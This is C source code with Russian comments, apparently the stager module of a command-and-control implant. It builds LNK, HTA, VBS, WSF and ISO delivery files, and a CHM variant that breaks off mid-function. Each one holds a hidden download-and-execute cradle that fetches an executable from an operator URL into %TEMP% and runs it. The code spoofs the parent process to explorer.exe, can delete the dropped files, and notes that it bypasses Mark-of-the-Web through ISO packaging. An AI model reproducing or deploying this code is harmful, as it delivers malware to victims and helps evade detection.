// cmd_stager.c — генераторы файлов-доставщиков (LNK/HTA/VBS/WSF/ISO/CHM).
//
// Payload: <url>\0<out_path>\0<flags>
//   flags бит 0 (STAGER_RM_AFTER): удалить файл с диска через 500 мс после спауна.
//   Без флага файл остаётся на диске.
//
// Каждая команда создаёт файл, затем спаунит нужный интерпретатор через explorer.exe
// (PPID-спуфинг: PROC_THREAD_ATTRIBUTE_PARENT_PROCESS). Дерево процессов:
//   explorer.exe → mshta.exe / wscript.exe / hh.exe / cmd.exe

#define STAGER_RM_AFTER 0x01

#include "../core/beacon.h"
#include <shlobj.h>     // IShellLink, CLSID_ShellLink
#include <objbase.h>    // CoInitializeEx, CoCreateInstance, CoUninitialize
#include <tlhelp32.h>   // CreateToolhelp32Snapshot, PROCESSENTRY32W

// ---- вспомогательные функции без CRT -------------------------------------

static int st_strlen(const char* s) {
    int n = 0; while (s[n]) ++n; return n;
}

// UTF-8 → wchar_t (без CRT).
static void st_to_wide(const char* src, wchar_t* dst, int cap) {
    if (!cap) return;
    int n = MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, cap - 1);
    if (n <= 0) dst[0] = 0;
    else dst[n] = 0;
}

// Записать файл; возвращает 1 при успехе.
static int st_write_file(const wchar_t* path, const void* data, DWORD len) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD written = 0;
    WriteFile(h, data, len, &written, NULL);
    CloseHandle(h);
    return (written == len);
}

// Разбор payload: url\0out_path\0flags → указатели и флаг-байт.
// flags может отсутствовать (старые клиенты) — тогда 0.
// Возвращает 0 если формат неверный.
static int st_parse(const BeaconTask* t, const char** url,
                    const char** path, uint8_t* flags) {
    if (!t->pay || t->pay_len < 3) return 0;
    const char* p = (const char*)t->pay;
    const char* end = p + t->pay_len;
    *url = p;
    while (p < end && *p) ++p;
    if (p >= end) return 0;
    ++p; // пропустить \0 после url
    if (p >= end || !*p) return 0;
    *path = p;
    while (p < end && *p) ++p;
    // флаг-байт после \0 пути (опциональный)
    *flags = 0;
    if (p + 1 < end) *flags = (uint8_t)*(p + 1);
    return 1;
}

// Конкатенация wchar_t строки в буфер.
static int st_wcat(wchar_t* dst, int pos, int cap, const wchar_t* src) {
    int i = 0;
    while (src[i] && pos + i < cap - 1) { dst[pos + i] = src[i]; ++i; }
    dst[pos + i] = 0;
    return pos + i;
}

// Найти PID первого процесса с именем name (без учёта регистра).
// Возвращает 0 если не найден.
static DWORD st_find_pid(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            int match = 1;
            for (int i = 0; ; ++i) {
                wchar_t a = pe.szExeFile[i];
                wchar_t b = name[i];
                if (a >= L'A' && a <= L'Z') a += 32;
                if (b >= L'A' && b <= L'Z') b += 32;
                if (a != b) { match = 0; break; }
                if (!a) break;
            }
            if (match) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

// Запустить cmdline с PPID-спуфингом через explorer.exe (CREATE_SUSPENDED → Resume).
// Если explorer.exe не найден или OpenProcess не удался — fallback без спуфинга.
// Возвращает 1 при успехе.
static int st_spawn(const wchar_t* cmdline) {
    wchar_t cl[4096];
    int n = 0;
    while (cmdline[n] && n < 4095) { cl[n] = cmdline[n]; ++n; }
    cl[n] = 0;

    // Попытка PPID-спуфинга: открыть explorer.exe с PROCESS_CREATE_PROCESS
    DWORD  explorer_pid = st_find_pid(L"explorer.exe");
    HANDLE h_parent     = NULL;
    if (explorer_pid)
        h_parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorer_pid);

    PROCESS_INFORMATION pi;
    rt_memset(&pi, 0, sizeof(pi));
    BOOL ok = FALSE;

    if (h_parent) {
        // Выделить PROC_THREAD_ATTRIBUTE_LIST под один атрибут
        SIZE_T attr_size = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
        LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
            (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, attr_size);

        if (attr_list && InitializeProcThreadAttributeList(
                attr_list, 1, 0, &attr_size)) {
            UpdateProcThreadAttribute(
                attr_list, 0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &h_parent, sizeof(h_parent), NULL, NULL);

            STARTUPINFOEXW siex;
            rt_memset(&siex, 0, sizeof(siex));
            siex.StartupInfo.cb = sizeof(siex);
            siex.lpAttributeList = attr_list;

            ok = CreateProcessW(NULL, cl, NULL, NULL, FALSE,
                                CREATE_SUSPENDED | CREATE_NO_WINDOW |
                                EXTENDED_STARTUPINFO_PRESENT,
                                NULL, NULL,
                                (LPSTARTUPINFOW)&siex, &pi);

            DeleteProcThreadAttributeList(attr_list);
        }
        if (attr_list) HeapFree(GetProcessHeap(), 0, attr_list);
        CloseHandle(h_parent);
    }

    // Fallback: обычный спаун без спуфинга
    if (!ok) {
        STARTUPINFOW si;
        rt_memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        ok = CreateProcessW(NULL, cl, NULL, NULL, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW,
                            NULL, NULL, &si, &pi);
    }

    if (!ok) return 0;
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

// Если STAGER_RM_AFTER: подождать 500 мс (интерпретатор читает файл),
// затем удалить файл с диска.
static void st_maybe_delete(const wchar_t* wpath, uint8_t flags) {
    if (!(flags & STAGER_RM_AFTER)) return;
    Sleep(500);
    DeleteFileW(wpath);
}

// Строковая конкатенация в буфер (без CRT).
static int st_cat(char* dst, int pos, int cap, const char* src) {
    int i = 0;
    while (src[i] && pos + i < cap - 1) {
        dst[pos + i] = src[i];
        ++i;
    }
    dst[pos + i] = 0;
    return pos + i;
}

// ---- stager_lnk -----------------------------------------------------------
// Создаёт .lnk файл через IShellLink (COM).
// Target: cmd.exe, Args: /c start /min powershell -nop -w hidden -c "..."
// Payload PowerShell: скачать URL в %TEMP%\s.exe, запустить.

void cmd_stager_lnk(const BeaconTask* t) {
    const char* url  = NULL;
    const char* path = NULL;
    uint8_t     flags = 0;
    if (!st_parse(t, &url, &path, &flags)) {
        const char err[] = "stager_lnk: usage: <url> <out_path>\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL    co_inited = SUCCEEDED(hr) || hr == S_FALSE;

    // Строим строку аргументов cmd.exe.
    // /c start /min powershell -nop -w hidden -c "iwr 'URL' -outf $env:TEMP\s.exe;Start-Process $env:TEMP\s.exe"
    char args[2048];
    int  ap = 0;
    const char a1[] = "/c start /min powershell -nop -w hidden -c \"iwr '";
    ap = st_cat(args, ap, (int)sizeof(args), a1);
    ap = st_cat(args, ap, (int)sizeof(args), url);
    const char a2[] = "' -outf $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe\"";
    ap = st_cat(args, ap, (int)sizeof(args), a2);

    wchar_t wargs[2048];
    st_to_wide(args, wargs, 2048);

    wchar_t wout[MAX_PATH];
    st_to_wide(path, wout, MAX_PATH);

    // Путь к cmd.exe: %SystemRoot%\System32\cmd.exe
    wchar_t wtarget[MAX_PATH];
    GetSystemDirectoryW(wtarget, MAX_PATH);
    // Добавить \cmd.exe
    int wl = 0; while (wtarget[wl]) ++wl;
    const wchar_t leaf[] = L"\\cmd.exe";
    for (int i = 0; leaf[i]; ++i) wtarget[wl++] = leaf[i];
    wtarget[wl] = 0;

    // Путь к shell32.dll для иконки
    wchar_t wshell32[MAX_PATH];
    GetSystemDirectoryW(wshell32, MAX_PATH);
    int sl = 0; while (wshell32[sl]) ++sl;
    const wchar_t sleaf[] = L"\\shell32.dll";
    for (int i = 0; sleaf[i]; ++i) wshell32[sl++] = sleaf[i];
    wshell32[sl] = 0;

    // COM: создать IShellLinkW
    // CLSID_ShellLink = {00021401-0000-0000-C000-000000000046}
    static const CLSID clsid_shell_link = {
        0x00021401, 0x0000, 0x0000,
        { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
    };
    static const IID iid_shell_link_w = {
        0x000214F9, 0x0000, 0x0000,
        { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
    };
    static const IID iid_persist_file = {
        0x0000010B, 0x0000, 0x0000,
        { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
    };

    IShellLinkW* psl = NULL;
    hr = CoCreateInstance(&clsid_shell_link, NULL, CLSCTX_INPROC_SERVER,
                          &iid_shell_link_w, (void**)&psl);
    if (FAILED(hr) || !psl) {
        const char err[] = "stager_lnk: CoCreateInstance(IShellLink) failed\n";
        out_write(err, sizeof(err) - 1);
        if (co_inited) CoUninitialize();
        return;
    }

    psl->lpVtbl->SetPath(psl, wtarget);
    psl->lpVtbl->SetArguments(psl, wargs);
    psl->lpVtbl->SetIconLocation(psl, wshell32, 2);  // значок документа
    psl->lpVtbl->SetShowCmd(psl, SW_HIDE);
    psl->lpVtbl->SetDescription(psl, L"");

    IPersistFile* ppf = NULL;
    hr = psl->lpVtbl->QueryInterface(psl, &iid_persist_file, (void**)&ppf);
    if (SUCCEEDED(hr) && ppf) {
        hr = ppf->lpVtbl->Save(ppf, wout, TRUE);
        ppf->lpVtbl->Release(ppf);
    }
    psl->lpVtbl->Release(psl);
    if (co_inited) CoUninitialize();

    if (SUCCEEDED(hr)) {
        // Запуск: cmd.exe /c start /b "" "<path>"
        wchar_t cl[MAX_PATH + 32];
        int cp = 0;
        cp = st_wcat(cl, cp, MAX_PATH + 32, L"cmd.exe /c start /b \"\" \"");
        cp = st_wcat(cl, cp, MAX_PATH + 32, wout);
             st_wcat(cl, cp, MAX_PATH + 32, L"\"");

        char msg[512];
        int mp = 0;
        mp = st_cat(msg, mp, (int)sizeof(msg), "stager_lnk: created ");
        mp = st_cat(msg, mp, (int)sizeof(msg), path);
        if (st_spawn(cl)) {
            const char ok[] = " -> spawned cmd.exe";
            mp = st_cat(msg, mp, (int)sizeof(msg), ok);
        } else {
            const char fail[] = " -> spawn failed";
            mp = st_cat(msg, mp, (int)sizeof(msg), fail);
        }
        msg[mp++] = '\n'; msg[mp] = 0;
        out_write(msg, mp);
        st_maybe_delete(wout, flags);
    } else {
        const char err[] = "stager_lnk: IPersistFile::Save failed\n";
        out_write(err, sizeof(err) - 1);
    }
}

// ---- stager_hta -----------------------------------------------------------
// Создаёт HTML Application (.hta).
// При запуске через mshta.exe: скачивает payload URL → %TEMP%\s.exe → запускает.

void cmd_stager_hta(const BeaconTask* t) {
    const char* url  = NULL;
    const char* path = NULL;
    uint8_t     flags = 0;
    if (!st_parse(t, &url, &path, &flags)) {
        const char err[] = "stager_hta: usage: <url> <out_path>\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    // Шаблон HTA (VBScript + ADODB.Stream + XMLHTTP).
    // Окно минимизировано, скрыто из панели задач, самозакрывается.
    char buf[4096];
    int  pos = 0;

    const char p1[] =
        "<html><head>\r\n"
        "<hta:application showInTaskbar=\"no\" windowState=\"minimize\" "
        "border=\"none\" caption=\"no\" maximizeButton=\"no\" minimizeButton=\"no\"/>\r\n"
        "<script language=\"VBScript\">\r\n"
        "Dim h,s,p\r\n"
        "Set h=CreateObject(\"MSXML2.XMLHTTP.6.0\")\r\n"
        "h.Open \"GET\",\"";
    pos = st_cat(buf, pos, (int)sizeof(buf), p1);
    pos = st_cat(buf, pos, (int)sizeof(buf), url);
    const char p2[] =
        "\",False\r\n"
        "h.Send\r\n"
        "p=Environ(\"TEMP\")&\"\\s.exe\"\r\n"
        "Set s=CreateObject(\"ADODB.Stream\")\r\n"
        "s.Type=1:s.Open:s.Write h.ResponseBody:s.SaveToFile p,2:s.Close\r\n"
        "CreateObject(\"WScript.Shell\").Run p,0\r\n"
        "Self.Close\r\n"
        "</script></head><body></body></html>\r\n";
    pos = st_cat(buf, pos, (int)sizeof(buf), p2);

    wchar_t wout[MAX_PATH];
    st_to_wide(path, wout, MAX_PATH);
    if (!st_write_file(wout, buf, (DWORD)pos)) {
        const char err[] = "stager_hta: write failed\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    // Запуск: mshta.exe "<path>"
    {
        wchar_t cl[MAX_PATH + 16];
        int cp = 0;
        cp = st_wcat(cl, cp, MAX_PATH + 16, L"mshta.exe \"");
        cp = st_wcat(cl, cp, MAX_PATH + 16, wout);
             st_wcat(cl, cp, MAX_PATH + 16, L"\"");

        char msg[512];
        int mp = 0;
        mp = st_cat(msg, mp, (int)sizeof(msg), "stager_hta: created ");
        mp = st_cat(msg, mp, (int)sizeof(msg), path);
        if (st_spawn(cl)) {
            const char ok[] = " -> spawned mshta.exe";
            mp = st_cat(msg, mp, (int)sizeof(msg), ok);
        } else {
            const char fail[] = " -> spawn failed";
            mp = st_cat(msg, mp, (int)sizeof(msg), fail);
        }
        msg[mp++] = '\n'; msg[mp] = 0;
        out_write(msg, mp);
        st_maybe_delete(wout, flags);
    }
}

// ---- stager_vbs -----------------------------------------------------------
// Создаёт VBScript-файл (.vbs).
// Запускается через wscript.exe или двойным кликом.

void cmd_stager_vbs(const BeaconTask* t) {
    const char* url  = NULL;
    const char* path = NULL;
    uint8_t     flags = 0;
    if (!st_parse(t, &url, &path, &flags)) {
        const char err[] = "stager_vbs: usage: <url> <out_path>\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    char buf[2048];
    int  pos = 0;

    const char p1[] =
        "Dim h,s,p\r\n"
        "Set h=CreateObject(\"MSXML2.XMLHTTP.6.0\")\r\n"
        "h.Open \"GET\",\"";
    pos = st_cat(buf, pos, (int)sizeof(buf), p1);
    pos = st_cat(buf, pos, (int)sizeof(buf), url);
    const char p2[] =
        "\",False\r\n"
        "h.Send\r\n"
        "p=CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")&\"\\s.exe\"\r\n"
        "Set s=CreateObject(\"ADODB.Stream\")\r\n"
        "s.Type=1:s.Open:s.Write h.ResponseBody:s.SaveToFile p,2:s.Close\r\n"
        "CreateObject(\"WScript.Shell\").Run p,0\r\n";
    pos = st_cat(buf, pos, (int)sizeof(buf), p2);

    wchar_t wout[MAX_PATH];
    st_to_wide(path, wout, MAX_PATH);
    if (!st_write_file(wout, buf, (DWORD)pos)) {
        const char err[] = "stager_vbs: write failed\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    // Запуск: wscript.exe //nologo //b "<path>"
    {
        wchar_t cl[MAX_PATH + 32];
        int cp = 0;
        cp = st_wcat(cl, cp, MAX_PATH + 32, L"wscript.exe //nologo //b \"");
        cp = st_wcat(cl, cp, MAX_PATH + 32, wout);
             st_wcat(cl, cp, MAX_PATH + 32, L"\"");

        char msg[512];
        int mp = 0;
        mp = st_cat(msg, mp, (int)sizeof(msg), "stager_vbs: created ");
        mp = st_cat(msg, mp, (int)sizeof(msg), path);
        if (st_spawn(cl)) {
            const char ok[] = " -> spawned wscript.exe";
            mp = st_cat(msg, mp, (int)sizeof(msg), ok);
        } else {
            const char fail[] = " -> spawn failed";
            mp = st_cat(msg, mp, (int)sizeof(msg), fail);
        }
        msg[mp++] = '\n'; msg[mp] = 0;
        out_write(msg, mp);
        st_maybe_delete(wout, flags);
    }
}

// ---- stager_wsf -----------------------------------------------------------
// Создаёт Windows Script File (.wsf) — XML-обёртка над VBScript.
// Запускается через wscript.exe; даёт возможность смешивать движки.

void cmd_stager_wsf(const BeaconTask* t) {
    const char* url  = NULL;
    const char* path = NULL;
    uint8_t     flags = 0;
    if (!st_parse(t, &url, &path, &flags)) {
        const char err[] = "stager_wsf: usage: <url> <out_path>\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    char buf[2048];
    int  pos = 0;

    const char p1[] =
        "<?xml version=\"1.0\"?>\r\n"
        "<package><job id=\"run\"><script language=\"VBScript\"><![CDATA[\r\n"
        "Dim h,s,p\r\n"
        "Set h=CreateObject(\"MSXML2.XMLHTTP.6.0\")\r\n"
        "h.Open \"GET\",\"";
    pos = st_cat(buf, pos, (int)sizeof(buf), p1);
    pos = st_cat(buf, pos, (int)sizeof(buf), url);
    const char p2[] =
        "\",False\r\n"
        "h.Send\r\n"
        "p=CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\")&\"\\s.exe\"\r\n"
        "Set s=CreateObject(\"ADODB.Stream\")\r\n"
        "s.Type=1:s.Open:s.Write h.ResponseBody:s.SaveToFile p,2:s.Close\r\n"
        "CreateObject(\"WScript.Shell\").Run p,0\r\n"
        "]]></script></job></package>\r\n";
    pos = st_cat(buf, pos, (int)sizeof(buf), p2);

    wchar_t wout[MAX_PATH];
    st_to_wide(path, wout, MAX_PATH);
    if (!st_write_file(wout, buf, (DWORD)pos)) {
        const char err[] = "stager_wsf: write failed\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    // Запуск: wscript.exe //nologo //b "<path>"
    {
        wchar_t cl[MAX_PATH + 32];
        int cp = 0;
        cp = st_wcat(cl, cp, MAX_PATH + 32, L"wscript.exe //nologo //b \"");
        cp = st_wcat(cl, cp, MAX_PATH + 32, wout);
             st_wcat(cl, cp, MAX_PATH + 32, L"\"");

        char msg[512];
        int mp = 0;
        mp = st_cat(msg, mp, (int)sizeof(msg), "stager_wsf: created ");
        mp = st_cat(msg, mp, (int)sizeof(msg), path);
        if (st_spawn(cl)) {
            const char ok[] = " -> spawned wscript.exe";
            mp = st_cat(msg, mp, (int)sizeof(msg), ok);
        } else {
            const char fail[] = " -> spawn failed";
            mp = st_cat(msg, mp, (int)sizeof(msg), fail);
        }
        msg[mp++] = '\n'; msg[mp] = 0;
        out_write(msg, mp);
        st_maybe_delete(wout, flags);
    }
}

// ---- stager_iso -----------------------------------------------------------
// Создаёт ISO-образ через IMAPI2 (Windows Vista+).
// Внутри ISO лежит launch.lnk → PowerShell download cradle.
// Файлы внутри ISO не получают MOTW (Mark of the Web) при монтировании.

// IMAPI2 GUIDs (из imapi2fs.h — объявляем вручную, чтобы не тащить заголовок)
static const CLSID CLSID_MsftFileSystemImage_local = {
    0x2C941FC5, 0x975B, 0x59BE,
    { 0xA9, 0x60, 0x9A, 0x2A, 0x26, 0x28, 0x53, 0xA5 }
};
static const IID IID_IFileSystemImage_local = {
    0x2C941FD3, 0x975B, 0x59BE,
    { 0xA9, 0x60, 0x9A, 0x2A, 0x26, 0x28, 0x53, 0xA5 }
};
// IFileSystemImage::get_Root → IFsiDirectoryItem
static const IID IID_IFsiDirectoryItem_local = {
    0x2C941FD5, 0x975B, 0x59BE,
    { 0xA9, 0x60, 0x9A, 0x2A, 0x26, 0x28, 0x53, 0xA5 }
};
// IFileSystemImageResult
static const IID IID_IFileSystemImageResult_local = {
    0x2C941FD7, 0x975B, 0x59BE,
    { 0xA9, 0x60, 0x9A, 0x2A, 0x26, 0x28, 0x53, 0xA5 }
};

// Вспомогательная: создать временный LNK в папке temp_dir\launch.lnk
static int make_temp_lnk(const wchar_t* lnk_path, const char* url) {
    static const CLSID clsid_sl = {
        0x00021401, 0x0000, 0x0000,
        { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
    };
    static const IID iid_slw = {
        0x000214F9, 0x0000, 0x0000,
        { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
    };
    static const IID iid_pf = {
        0x0000010B, 0x0000, 0x0000,
        { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 }
    };

    // Target: cmd.exe
    wchar_t wtarget[MAX_PATH];
    GetSystemDirectoryW(wtarget, MAX_PATH);
    int wl = 0; while (wtarget[wl]) ++wl;
    const wchar_t cleaf[] = L"\\cmd.exe";
    for (int i = 0; cleaf[i]; ++i) wtarget[wl++] = cleaf[i];
    wtarget[wl] = 0;

    // Arguments
    char args[1024];
    int ap = 0;
    const char a1[] = "/c start /min powershell -nop -w hidden -c \"iwr '";
    ap = st_cat(args, ap, (int)sizeof(args), a1);
    ap = st_cat(args, ap, (int)sizeof(args), url);
    const char a2[] = "' -outf $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe\"";
    ap = st_cat(args, ap, (int)sizeof(args), a2);
    wchar_t wargs[1024];
    st_to_wide(args, wargs, 1024);

    IShellLinkW* psl = NULL;
    HRESULT hr = CoCreateInstance(&clsid_sl, NULL, CLSCTX_INPROC_SERVER,
                                   &iid_slw, (void**)&psl);
    if (FAILED(hr) || !psl) return 0;

    psl->lpVtbl->SetPath(psl, wtarget);
    psl->lpVtbl->SetArguments(psl, wargs);
    psl->lpVtbl->SetShowCmd(psl, SW_HIDE);

    IPersistFile* ppf = NULL;
    hr = psl->lpVtbl->QueryInterface(psl, &iid_pf, (void**)&ppf);
    if (SUCCEEDED(hr) && ppf) {
        hr = ppf->lpVtbl->Save(ppf, lnk_path, TRUE);
        ppf->lpVtbl->Release(ppf);
    }
    psl->lpVtbl->Release(psl);
    return SUCCEEDED(hr) ? 1 : 0;
}

void cmd_stager_iso(const BeaconTask* t) {
    const char* url  = NULL;
    const char* path = NULL;
    uint8_t     flags = 0;
    if (!st_parse(t, &url, &path, &flags)) {
        const char err[] = "stager_iso: usage: <url> <out_path>\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    BOOL co_inited = SUCCEEDED(hr) || hr == S_FALSE;

    // 1. Создать временную папку %TEMP%\iso_XXXX (уникальное имя по GetTickCount)
    wchar_t temp_base[MAX_PATH];
    GetTempPathW(MAX_PATH, temp_base);
    // Уникальное имя: iso_ + GetTickCount
    DWORD tick = GetTickCount();
    wchar_t* tp = temp_base;
    while (*tp) ++tp;
    // Добавить iso_XXXXXXXX
    const wchar_t iso_pfx[] = L"iso_";
    for (int i = 0; iso_pfx[i]; ++i) *tp++ = iso_pfx[i];
    // tick в hex
    for (int i = 7; i >= 0; --i) {
        DWORD nibble = (tick >> (i * 4)) & 0xF;
        *tp++ = (wchar_t)(nibble < 10 ? L'0' + nibble : L'a' + nibble - 10);
    }
    *tp++ = L'\\'; *tp = 0;

    if (!CreateDirectoryW(temp_base, NULL)) {
        const char err[] = "stager_iso: failed to create temp dir\n";
        out_write(err, sizeof(err) - 1);
        if (co_inited) CoUninitialize();
        return;
    }

    // 2. Создать launch.lnk в temp_base
    wchar_t lnk_path[MAX_PATH];
    rt_memcpy(lnk_path, temp_base, sizeof(wchar_t) * (tp - temp_base));
    const wchar_t lnk_name[] = L"launch.lnk";
    wchar_t* lp = lnk_path + (tp - temp_base) - 1; // перед финальным '\'
    ++lp;
    for (int i = 0; lnk_name[i]; ++i) *lp++ = lnk_name[i];
    *lp = 0;

    if (!make_temp_lnk(lnk_path, url)) {
        const char err[] = "stager_iso: failed to create temp LNK\n";
        out_write(err, sizeof(err) - 1);
        RemoveDirectoryW(temp_base);
        if (co_inited) CoUninitialize();
        return;
    }

    // 3. IMAPI2: IFileSystemImage
    // Используем IDispatch-подход через IFileSystemImage COM-интерфейс.
    // Интерфейс слишком большой для ручного объявления vtbl, поэтому
    // применяем dispatch-вызовы через ole32 / oleaut32.
    // Альтернатива: вызов через IDispatch::Invoke с именами методов.
    //
    // Для краткости и надёжности используем PowerShell одной строкой,
    // запущенный через CreateProcessW — он доступен на любой Windows 7+.

    wchar_t wout[MAX_PATH];
    st_to_wide(path, wout, MAX_PATH);

    // PowerShell-команда: создать ISO из папки temp_base в файл wout.
    // New-IsoFile — нестандартный командлет, поэтому используем IMAPI2 напрямую
    // через скрипт PS.
    //
    // ps_cmd: скрипт, который создаёт ISO через IMAPI2 из папки $src в файл $dst.
    wchar_t ps_script[4096];
    wchar_t* sp = ps_script;

    // Строим wchar_t строку вручную из литерала
    const wchar_t part1[] =
        L"$fsi=[Runtime.InteropServices.Marshal]::CreateWrapperOfType("
        L"[Activator]::CreateInstance([Type]::GetTypeFromProgID('IMAPI2FS.MsftFileSystemImage')),"
        L"[System.Type]::GetType('Interop.IMAPI2FS.MsftFileSystemImageClass,IMAPI2FS,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35'));"
        L"$fsi=$null;"
        // Более простой вариант через New-Object и Add-Type
        L"$cd=[System.Type]::GetTypeFromProgID('IMAPI2FS.MsftFileSystemImage');"
        L"$img=[System.Activator]::CreateInstance($cd);"
        L"$img.FileSystemsToCreate=3;"  // ISO9660+Joliet
        L"$img.VolumeName='VOLUME';"
        L"$img.Root.AddTree('";
    for (int i = 0; part1[i] && sp - ps_script < 3900; ++i) *sp++ = part1[i];

    // Добавить temp_base (без финального \)
    wchar_t* tbp = temp_base;
    while (*tbp && sp - ps_script < 3900) {
        if (*tbp == L'\\') { *sp++ = L'\\'; *sp++ = L'\\'; }
        else *sp++ = *tbp;
        ++tbp;
    }
    /* strip trailing double-backslash that the escaping loop appended */
    if (sp > ps_script + 2 && *(sp-1) == L'\\' && *(sp-2) == L'\\') sp -= 2;

    const wchar_t part2[] = L"',$false);"
        L"$res=$img.CreateResultImage();"
        L"$stream=$res.ImageStream;"
        L"$out=[System.IO.File]::Open('";
    for (int i = 0; part2[i] && sp - ps_script < 3900; ++i) *sp++ = part2[i];

    // Добавить wout
    wchar_t* op = wout;
    while (*op && sp - ps_script < 3900) {
        if (*op == L'\\') { *sp++ = L'\\'; *sp++ = L'\\'; }
        else *sp++ = *op;
        ++op;
    }

    const wchar_t part3[] =
        L"',[System.IO.FileMode]::Create,[System.IO.FileAccess]::Write,[System.IO.FileShare]::None);"
        L"$buf=New-Object byte[] 65536;"
        L"$stream.Seek(0,0)|Out-Null;"
        L"while(($n=$stream.Read($buf,0,65536)) -gt 0){$out.Write($buf,0,$n)};"
        L"$out.Close();$stream.Close()";
    for (int i = 0; part3[i] && sp - ps_script < 3900; ++i) *sp++ = part3[i];
    *sp = 0;

    // Запустить powershell.exe -nop -w hidden -Command <script>
    wchar_t cmdline[4096];
    wchar_t* cp = cmdline;
    const wchar_t pfx[] = L"powershell.exe -nop -w hidden -Command \"";
    for (int i = 0; pfx[i]; ++i) *cp++ = pfx[i];
    for (wchar_t* sc = ps_script; *sc && cp - cmdline < 4000; ++sc) {
        // Экранировать кавычки внутри -Command "..."
        if (*sc == L'"') { *cp++ = L'\\'; *cp++ = L'"'; }
        else *cp++ = *sc;
    }
    *cp++ = L'"'; *cp = 0;

    STARTUPINFOW si;
    rt_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    rt_memset(&pi, 0, sizeof(pi));

    BOOL ok = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) {
        const char err[] = "stager_iso: CreateProcess(powershell) failed\n";
        out_write(err, sizeof(err) - 1);
    } else {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Проверить что файл создан
        DWORD attrs = GetFileAttributesW(wout);
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            const char err[] = "stager_iso: ISO creation failed (IMAPI2 not available?)\n";
            out_write(err, sizeof(err) - 1);
        } else {
            char msg[512];
            int mp = 0;
            // Запуск: PowerShell монтирует ISO, запускает launch.lnk внутри.
            // $m=Mount-DiskImage '<path>' -PassThru;
            // $l=($m|Get-Volume).DriveLetter;
            // Start-Process "${l}:\launch.lnk"
            wchar_t ps[4096];
            int pp = 0;
            pp = st_wcat(ps, pp, 4096,
                L"powershell.exe -nop -w hidden -c \""
                L"$m=Mount-DiskImage '");
            pp = st_wcat(ps, pp, 4096, wout);
            pp = st_wcat(ps, pp, 4096,
                L"' -PassThru;"
                L"$l=($m|Get-Volume).DriveLetter;"
                L"Start-Process \\\"${l}:\\\\launch.lnk\\\"\"");

            mp = st_cat(msg, mp, (int)sizeof(msg), "stager_iso: created ");
            mp = st_cat(msg, mp, (int)sizeof(msg), path);
            if (st_spawn(ps)) {
                const char spawned[] = " -> spawned powershell (Mount-DiskImage)";
                mp = st_cat(msg, mp, (int)sizeof(msg), spawned);
            } else {
                const char fail[] = " -> spawn failed";
                mp = st_cat(msg, mp, (int)sizeof(msg), fail);
            }
            msg[mp++] = '\n'; msg[mp] = 0;
            out_write(msg, mp);
            // ISO не удаляем сразу — он может быть смонтирован; --rm-after
            // удалит через 500 мс (может упасть если том ещё смонтирован,
            // но PowerShell размонтирует его самостоятельно после Start-Process).
            st_maybe_delete(wout, flags);
        }
    }

    // Удалить временный LNK и папку
    DeleteFileW(lnk_path);
    RemoveDirectoryW(temp_base);

    if (co_inited) CoUninitialize();
}

// ---- stager_chm -----------------------------------------------------------
// Создаёт CHM-файл через hhc.exe (HTML Help Compiler).
// hhc.exe есть в Windows SDK / HTML Help Workshop, но редко на целях.
// Если не найден — пишет ошибку.
//
// Содержимое: HTML с JScript ActiveX, скачивает payload и запускает.

void cmd_stager_chm(const BeaconTask* t) {
    const char* url  = NULL;
    const char* path = NULL;
    uint8_t     flags = 0;
    if (!st_parse(t, &url, &path, &flags)) {
        const char err[] = "stager_chm: usage: <url> <out_path>\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    // Найти hhc.exe: %ProgramFiles%\HTML Help Workshop\hhc.exe
